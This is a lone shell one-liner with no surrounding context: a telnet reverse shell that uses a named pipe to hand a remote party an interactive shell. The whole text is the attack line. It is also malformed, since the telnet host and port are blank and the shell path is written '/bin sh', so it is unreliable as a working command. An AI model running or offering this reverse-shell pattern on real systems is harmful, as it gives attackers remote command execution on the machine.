TF=$(mktemp -u); mkfifo $TF && telnet   0<$TF | /bin sh 1>$TF
